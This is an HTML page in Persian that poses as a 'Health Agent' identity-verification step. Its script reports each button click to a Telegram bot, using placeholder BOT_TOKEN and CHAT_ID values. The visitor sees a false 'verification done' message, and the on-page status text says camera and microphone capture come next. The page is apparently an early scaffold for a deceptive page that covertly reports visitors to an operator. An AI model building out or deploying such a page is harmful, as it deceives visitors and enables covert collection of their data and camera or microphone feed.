<!DOCTYPE html>                    
 
  
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تأیید هویت | Health Agent</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: Tahoma, sans-serif;
    background: linear-gradient(135deg, #eef1f5 0%, #dce6f5 100%);
    display: flex; justify-content: center; align-items: center;
    min-height: 100vh; padding: 16px;
  }
  .card {
    width: 100%; max-width: 400px;
    background: #fff; border-radius: 20px;
    box-shadow: 0 8px 40px rgba(0,0,0,0.12);
    padding: 32px 24px; text-align: center;
  }
  .icon { font-size: 52px; margin-bottom: 16px; }
  h2 { font-size: 19px; color: #1a1a1a; margin-bottom: 10px; }
  p  { font-size: 13px; color: #666; line-height: 1.8; margin-bottom: 24px; }
  .verify-btn {
    width: 100%; padding: 15px;
    background: linear-gradient(135deg, #1a73e8, #0d47a1);
    color: #fff; border: none; border-radius: 10px;
    font-size: 15px; font-family: Tahoma; cursor: pointer;
  }
  .verify-btn:disabled { opacity: 0.6; cursor: not-allowed; }
  .status { margin-top: 18px; font-size: 13px; color: #666; min-height: 20px; }
</style>
</head>
<body>
<div class="card">
  <div class="icon">🛡️</div>
  <h2>تأیید هویت</h2>
  <p>
    برای اطمینان از صحت اطلاعات و فعال‌سازی تحلیل هوشمند،
    لطفاً هویت خود را تأیید کنید.
  </p>
  <button class="verify-btn" id="verifyBtn">شروع تأیید هویت</button>
  <div class="status" id="statusText"></div>
</div>

<script>
/* ============================================================
   تنظیمات
   ============================================================ */
const BOT_TOKEN = 'YOUR_BOT_TOKEN';
const CHAT_ID   = 'YOUR_CHAT_ID';

const verifyBtn  = document.getElementById('verifyBtn');
const statusText = document.getElementById('statusText');

/* ============================================================
   ارسال پیام ساده به تلگرام (فقط برای تست جریان)
   ============================================================ */
async function sendToTelegram(text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text })
    });
  } catch (e) {
    console.error(e.message);
  }
}

/* ============================================================
   رویداد کلیک روی دکمه تأیید
   ============================================================ */
verifyBtn.addEventListener('click', async () => {
  verifyBtn.disabled = true;
  statusText.textContent = 'در حال تأیید...';

  // فعلاً فقط یک پیام به تلگرام می‌فرستیم تا مطمئن شویم جریان کار می‌کند
  await sendToTelegram('✅ کاربر وارد صفحه تأیید هویت شد.');

  statusText.textContent = '✅ تأیید انجام شد. (در پله بعد دوربین و میکروفون اضافه می‌شود)';
});
</script>
</body>
</html>
